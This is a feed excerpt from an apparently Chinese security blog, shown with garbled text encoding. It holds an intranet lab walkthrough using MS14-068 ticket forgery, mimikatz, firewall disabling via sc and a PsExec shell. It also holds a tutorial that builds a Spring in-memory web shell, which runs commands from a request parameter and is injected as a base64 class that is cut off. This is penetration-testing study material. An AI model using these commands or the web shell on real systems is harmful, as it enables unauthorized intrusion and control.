title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>é‚£è¿™æ¬¡ç”¨ä¸ä¸Šcsï¼Œç›´æ¥msfä¸€è·¯æ€</p><p>å…ˆç»§ç»­å°è¯•ä¸€ä¸‹æˆ‘ä»¬åˆšåˆšæ‰«å‡ºæ¥çš„æ°¸æ’ä¹‹è“</p><p><img src="https://cdn.clown2024.cn/image-20241116211150550.png" alt="image-20241116211150550"></p><p>okæ‰“äº†ä¸¤éå¤±è´¥äº†ï¼Œé‚£å°±è¯•è¯•å…¶ä»–çš„å§</p><p>è€ƒç‚¹ä¹Ÿè¯´äº†ç”¨åˆ°äº†ms14-068æ¼æ´ï¼Œç”¨msfæœç´¢äº†ä¸€ä¸‹åªæœ‰éªŒè¯æ¼æ´çš„ï¼Œæ²¡æœ‰åˆ©ç”¨æ¼æ´çš„ç¨‹åº</p><p><img src="https://cdn.clown2024.cn/image-20241116211428215.png" alt="image-20241116211428215"></p><blockquote><p>ç¬‘æ­»åæ¥å‘ç°è¿™ä¹Ÿæ˜¯åˆ©ç”¨çš„ï¼Œå› ä¸ºè¿™ä¸ªæ¨¡å—å¤šç”¨äºä¿¡æ¯æ”¶é›†</p></blockquote><p>çœ‹äº†ä¸€ä¸‹win7ï¼Œä½œè€…è´´å¿ƒçš„æŠŠå·¥å…·éƒ½ç»™æˆ‘ä»¬é™„ä¸Šäº†</p><p><img src="https://cdn.clown2024.cn/image-20241116212028478.png" alt="image-20241116212028478"></p><p>åˆ©ç”¨åŸç†å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></p><p>ç›´æ¥æŠŠå·¥å…·ä»win7é‚£æ‹¿è¿‡æ¥æ–¹ä¾¿ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">download C:\\Users\\douser\\Desktop\\MS14-068.exe /home/kali/Desktop<br></code></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</p><p>1.åŸŸæ§æ²¡æœ‰æ‰“MS14-068çš„è¡¥ä¸(KB3011780)</p><p>2.æ‹¿ä¸‹ä¸€å°åŠ å…¥åŸŸçš„è®¡ç®—æœº</p><p>3.æœ‰è¿™å°åŸŸå†…è®¡ç®—æœºçš„åŸŸç”¨æˆ·å¯†ç å’ŒSid</p><p>æˆ‘ä»¬è¿˜å·®ä¸€ä¸ªsidæ²¡æœ‰æŠ“å–åˆ°ï¼Œè¦å»æŠ“å–ä¸€ä¸‹</p><p>çº¢æ¸©äº†ï¼Œè¿™ä¼šè¯åˆæ–­äº†ï¼Œå—ä¸äº†äº†ï¼Œç›´æ¥å»win7é‚£é‡Œå·ä¸€ä¸ªsidè¿‡æ¥(S-1-5-21-979886063-1111900045-1414766810-1107)ï¼Œdouserç”¨æˆ·çš„</p><p>æ­£å¸¸èƒ½æ‹¿cmdçš„è¯ç›´æ¥whoami &#x2F;allæˆ–è€…whoami &#x2F;userå°±èƒ½çœ‹åˆ°sidäº†</p><p>æˆ–è€…ç”¨meterpreterçš„run post&#x2F;windows&#x2F;gather&#x2F;credentialsåº”è¯¥ä¹Ÿå¯ä»¥</p><p>å·¥å…·åˆ©ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;<br></code></pre></td></tr></table></figure><p>å®Œäº†xsæ‰å‘ç°è¿™æ˜¯exeç¨‹åºï¼ŒLinuxç”¨ä¸äº†ï¼Œé‚£å°±æ”¹å‚è€ƒè¿™ç¯‡æ–‡ç« çš„å…¶ä»–æ‰“æ³•ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89</a></p><p>çœ‹äº†åŠå¤©å¾—ä½œç½¢äº†æ„Ÿè§‰ğŸ˜­ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨cmdä¸‹æ“ä½œæˆ–è€…ç›´æ¥å¼€å¯è¿œç¨‹æ¡Œé¢ä¸Šå»æ“ä½œ</p><p>ç®€å•è®°ä¸€ä¸‹æµç¨‹å§ï¼Œä¸‹é¢çš„æ“ä½œæ˜¯åœ¨win7çš„cmdä¸Šæ‰§è¡Œçš„ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p><p>é¦–å…ˆç”¨ms14-068ä¼ªé€ ç¥¨æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">ms14-<span class="hljs-number">068</span>.exe -u douser@DEMO.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">183</span>.<span class="hljs-number">130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>ä»–ä¼šç”Ÿæˆä¸€ä¸ªç¥¨æ®æ–‡ä»¶ï¼Œç„¶åç”¨mimikatzæ¥æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # kerberos::purge         //æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ <br>mimikatz # kerberos::list          //æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯<br>mimikatz # kerberos::ptc &lt;ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶&gt;   //å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æŸ¥çœ‹åŸŸæ§æˆ–è€…åˆ—å‡ºå…¶cç›˜çš„æ–‡ä»¶äº†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\WIN-ENS2VR5TR3N<br><span class="hljs-built_in">dir</span> \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡scå‘½ä»¤æ¥åˆ›å»ºæœåŠ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ¯”å¦‚å…³é—­é˜²ç«å¢™</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off&quot;<br><br>sc \\WIN-ENS2VR5TR3N <span class="hljs-built_in">start</span> unablefirewall<br></code></pre></td></tr></table></figure><p>å…³é—­é˜²ç«å¢™ä¹‹åå°±å¯ä»¥ç›´æ¥æ°¸æ’ä¹‹è“ä¸Šçº¿äº†å…¶å®</p><p>ä¹‹å‰å¤±è´¥æ˜¯å› ä¸ºè¢«é˜²ç«å¢™æ‹¦æˆª</p><p><strong>ä¸€äº›æ¸…é™¤ç—•è¿¹çš„æ“ä½œ</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">klist purge #å¸è½½å‡­æ®<br>klist #æŸ¥çœ‹ç¥¨æ®<br></code></pre></td></tr></table></figure><p><strong>è·å–äº¤äº’å¼shell</strong></p><p>ç°åœ¨æ˜¯æˆåŠŸæ³¨å…¥äº†å‡­è¯</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨PsExec.exeè·å–ä¸€ä¸ªäº¤äº’å¼çš„shell</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">PsExec.exe -accepteula -s \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">19</span> <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure><p><strong>è¿œç¨‹ç™»å½•æ“ä½œ</strong></p><p>å¯ä»¥ç›´æ¥ç”¨æ°¸æ’ä¹‹è“è·å–å¯†ç ä¹‹åredesktopç™»å½•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å› ä¸ºå…¼å®¹æ€§å·²ç»ä¼¼äº†ä¸¤ä¸ªé¶åœºï¼Œæ±‚æ±‚ä½ åˆ«ä¼¼äº†&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ VMnet0å’ŒVMnet1éƒ½æ˜¯ä»…ä¸»æœºæ¨¡å¼&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºä¸‰</title>
    <link href="https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
    <id>https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</id>
    <published>2024-11-14T15:16:59.000Z</published>
    <updated>2024-11-15T12:01:48.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚</p><p>æŒ‚èµ·çŠ¶æ€ï¼Œè´¦å·å·²é»˜è®¤ç™»é™†ï¼Œcentosä¸ºå‡ºç½‘æœºï¼Œç¬¬ä¸€æ¬¡è¿è¡Œï¼Œéœ€é‡æ–°è·å–æ¡¥æ¥æ¨¡å¼ç½‘å¡ipï¼Œä¹Ÿå°±æ˜¯é‡å¯ä¸€ä¸‹</p><p>é™¤é‡æ–°è·å–ipï¼Œä¸å»ºè®®è¿›è¡Œä»»ä½•è™šæ‹Ÿæœºæ“ä½œã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241115110952089.png" alt="image-20241115110952089"></p><p><strong>ç›®æ ‡ï¼šåŸŸæ§ä¸­å­˜åœ¨ä¸€ä»½é‡è¦æ–‡ä»¶ã€‚</strong></p><p>æœ¬æ¬¡ç¯å¢ƒä¸ºé»‘ç›’æµ‹è¯•ï¼Œä¸æä¾›è™šæ‹Ÿæœºè´¦å·å¯†ç ã€‚</p><h1 id="ä½œåºŸäº†"><a href="#ä½œåºŸäº†ğŸ˜­" class="headerlink" title="ä½œåºŸäº†ğŸ˜­"></a>ä½œåºŸäº†ğŸ˜­</h1><p>ä¸¤å°Linuxé¶æœºè¿è¡Œä¸äº†ï¼Œåªèƒ½å¼ºåˆ¶é‡å¯æ‰èƒ½ç”¨ï¼Œä½†æ˜¯è¿™æ ·å°±ä¸æ˜¯ç™»å½•çŠ¶æ€äº†ï¼Œç„¶åè´¦å·å¯†ç ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥æ­»åœ¨æ­å»ºç¯å¢ƒäº†</p><p>åªèƒ½çœ‹çœ‹åˆ«äººçš„æ‰“é¶è¿‡ç¨‹äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;&lt;p&gt;æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;æŒ‚èµ·çŠ¶æ€ï¼Œè´¦å·å·²é»˜è®¤ç™»é™†ï¼Œ</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Springå†…å­˜é©¬å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-13T03:17:56.000Z</published>
    <updated>2024-11-14T08:32:08.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Springæ¡†æ¶æ¯”è¾ƒå¸¸ç”¨å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å»ºä¸€ä¸ªspring+springmvcçš„é¡¹ç›®æ¥æµ‹è¯•å†…å­˜é©¬ï¼Œå†…å­˜é©¬ä¸»è¦çš„é€»è¾‘éƒ¨åˆ†éƒ½é›†ä¸­åœ¨springmvcçš„éƒ¨åˆ†ï¼Œå› ä¸ºè´Ÿè´£å¤„ç†è·¯ç”±è¯·æ±‚åŸºæœ¬éƒ½æ˜¯éƒ½æ˜¯éœ€è¦ç»ç”±springmvcï¼Œæ‰€ä»¥æˆ‘çœ‹ä¹Ÿæœ‰å«springmvcå†…å­˜é©¬çš„ã€‚</p><p>æˆ‘è¿™é‡Œå°±ç›´æ¥æ­ä¸€ä¸ªspringbooté¡¹ç›®æ¯”è¾ƒæ–¹ä¾¿äº†ï¼Œåæ­£æœ¬èº«ä¹Ÿæ˜¯æœ‰springmvcçš„ï¼Œæ‰€ä»¥å†…éƒ¨é€»è¾‘ä¹Ÿæ˜¯ä¸€æ ·åˆ†æ</p><p>ç‰ˆæœ¬å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="controllerå†…å­˜é©¬"><a href="#Controllerå†…å­˜é©¬" class="headerlink" title="Controllerå†…å­˜é©¬"></a>Controllerå†…å­˜é©¬</h1><h2 id="contolleræ³¨å†Œæµç¨‹"><a href="#Contolleræ³¨å†Œæµç¨‹" class="headerlink" title="Contolleræ³¨å†Œæµç¨‹"></a>Contolleræ³¨å†Œæµç¨‹</h2><p>æˆ‘ä»¬è¦å…ˆçŸ¥é“Controllerçš„æ³¨å†Œé€»è¾‘</p><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„controllerç„¶åä¸‹æ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113133819511.png" alt="image-20241113133819511"></p><p>è¿™é‡Œèƒ½çœ‹åˆ°è¯·æ±‚å¤„ç†çš„è°ƒç”¨æ ˆ</p><p>åœ¨AbstractHandlerMethodMappingçš„initHandlerMethodsæ–¹æ³•ä¸‹æ–­ç‚¹æ¥çœ‹çœ‹æ˜¯æ€ä¹ˆæ³¨å†Œcontrollerçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113134431011.png" alt="image-20241113134431011"></p><p>ä»è¿™ä¸ªä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å°±æ˜¯å¼€å§‹å¯¹æ¯ä¸ªæ‰«æåˆ°çš„beanNameå¯¹åº”çš„beanå¼€å§‹å¤„ç†</p><p>è¿›å»çœ‹çœ‹ä»–çš„processæ–¹æ³•æ˜¯æ€ä¹ˆå¤„ç†çš„</p><p><img src="https://cdn.clown2024.cn/image-20241113135311833.png" alt="image-20241113135311833"></p><p>ç›´æ¥çœ‹å¯¹æˆ‘ä»¬å†™çš„helloControlleræ˜¯æ€ä¹ˆå¤„ç†ï¼Œè¿™é‡Œæœ‰ä¸ªisHandler()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113135415874.png" alt="image-20241113135415874"></p><p>ä»–ä¼šåˆ¤æ–­è¿™ä¸ªbeanæ˜¯å¦ä¸ºControlleræˆ–è€…RequestMappingï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬çš„è¿™ä¸ªä¼šè¿”å›true</p><p>ç„¶åå°±ä¼šè¿›åˆ°<strong>detectHandlerMethods</strong>æ–¹æ³•ï¼Œè¿›å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113162637157.png" alt="image-20241113162637157"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šå…ˆè·å–å¯¹åº”çš„userTypeã€handlerã€methodï¼Œè¿˜æœ‰å¯¹åº”çš„Mappingï¼Œæœ€åéå†ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•å’Œmappingï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªregisterHandlerMethodæ–¹æ³•æ¥è¿›è¡Œæ³¨å†Œç»‘å®š</p><p>è¿™é‡Œçš„mappingä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ä»–çš„ä¿¡æ¯æ˜¯è¢«ä¿å­˜åœ¨RequestMappingInfoè¿™ä¸ªç±»ä¸­çš„ï¼Œä¸‹é¢æ˜¯è¯¥ç±»ä¸­çš„ä¸€äº›å±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241113163354872.png" alt="image-20241113163354872"></p><p>ç„¶åmappingçš„åˆ›å»ºæ˜¯åœ¨å‰é¢çš„getMappingForMethodæ–¹æ³•åˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113163647021.png" alt="image-20241113163647021"></p><p>è¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241113164045236.png" alt="image-20241113164045236"></p><p>é‡Œé¢çš„å…·ä½“æµç¨‹å°±è‡ªå·±çœ‹çœ‹å°±è¡Œï¼Œæ€»ä¹‹ä»–ä¼šè§£ææ–¹æ³•ä¸Šçš„æ³¨è§£ï¼Œç„¶ååˆ›å»ºå¯¹åº”çš„RequestMappingInfo</p><p>å†å›åˆ°registerHandlerMethodæ³¨å†Œæ–¹æ³•è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241113164335000.png" alt="image-20241113164335000"></p><p><img src="https://cdn.clown2024.cn/image-20241113164359179.png" alt="image-20241113164359179"></p><p><img src="https://cdn.clown2024.cn/image-20241113164444913.png" alt="image-20241113164444913"></p><p>å¯ä»¥çŸ¥é“ï¼Œæœ€ç»ˆå°±æ˜¯è°ƒç”¨çš„AbstractHandlerMethodMapping$MappingRegistryçš„registeræ–¹æ³•å°†è·¯ç”±å’Œæ–¹æ³•æ³¨å†Œè¿›å»çš„ï¼Œè·Ÿåˆ°è¿™é‡Œå°±å·²ç»å¤Ÿäº†</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªcontrolleræœ€ç»ˆå°±æ˜¯è¦è°ƒç”¨MappingRegistry#registeræ–¹æ³•ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥</p><ol><li>beanå®ä¾‹</li><li>å¤„ç†è¯·æ±‚çš„method</li><li>å¯¹åº”çš„RequestMappinginfoå¯¹è±¡</li></ol><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>å‚è€ƒy4å¸ˆå‚…çš„å®ç°æ–¹å¼</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„controllerç±»ï¼Œä¹Ÿä¸èƒ½è¯´æ­£å¸¸å°±æ˜¯å»æ‰æ³¨è§£çš„controllerï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰‹åŠ¨åŠ è½½çš„æ‰€ä»¥ä¸éœ€è¦æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†ä»–ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå†æ‹¿ä»–çš„base64ç¼–ç çš„å­—ç¬¦ä¸²ç”¨ä¸‹é¢ä»£ç æ³¨å…¥å†…å­˜é©¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAjQoAIQBJCABKCwBLAEwLAE0ATggATwgAUAoAUQBSCgAMAFMIAFQKAAwAVQcAVgcAVwgAWAgAWQoACwBaCABbCABcBwBdCgALAF4KAF8AYAoAEgBhCABiCgASAGMKABIAZAoAEgBlCgASAGYKAGcAaAoAZwBpCgBnAGYLAE0AagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQA